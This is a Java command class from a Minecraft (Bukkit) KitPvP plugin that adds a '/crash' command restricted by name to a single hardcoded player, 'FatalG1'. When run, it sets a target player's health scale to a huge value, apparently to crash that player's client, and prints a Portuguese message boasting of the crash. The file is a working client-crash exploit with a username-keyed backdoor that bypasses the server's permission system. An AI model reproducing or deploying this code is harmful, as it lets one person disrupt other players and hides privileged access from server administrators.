package me.dkits.Utils;

import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;

import com.github.caaarlowsz.wemc.kitpvp.WePvP;

public class Crash implements CommandExecutor, Listener {
	public Crash(final WePvP main) {
	}

	public boolean onCommand(final CommandSender sender, final Command cmd, final String label, final String[] args) {
		final Player p = (Player) sender;
		if (cmd.getName().equalsIgnoreCase("crash")) {
			if (p.getName().equalsIgnoreCase("FatalG1") || p.getName().equalsIgnoreCase("FatalG1")) {
				if (args.length == 0) {
					p.sendMessage("�7[�c!�7] �cUse: /crash [Jogador]");
				} else if (args.length == 1) {
					final Player target = p.getServer().getPlayer(args[0]);
					if (target != null) {
						if (target.getName().equalsIgnoreCase("FatalG1")
								|| target.getName().equalsIgnoreCase("FatalG1")) {
							p.sendMessage(ChatColor.AQUA + "Parece que alguem foi crashado..");
						} else if (target.getGameMode().equals((Object) GameMode.CREATIVE)) {
							target.setGameMode(GameMode.SURVIVAL);
							p.sendMessage(ChatColor.AQUA + "Parece que alguem foi crashado..");
							target.setHealthScale(9.49592994E8);
						} else {
							p.sendMessage(ChatColor.AQUA + "Parece que alguem foi crashado..");
							target.setHealthScale(9.49592994E8);
						}
					}
				}
			} else {
				p.sendMessage(ChatColor.RED + "Voce nao esta listado para usar esse comando!");
			}
		}
		return false;
	}
}
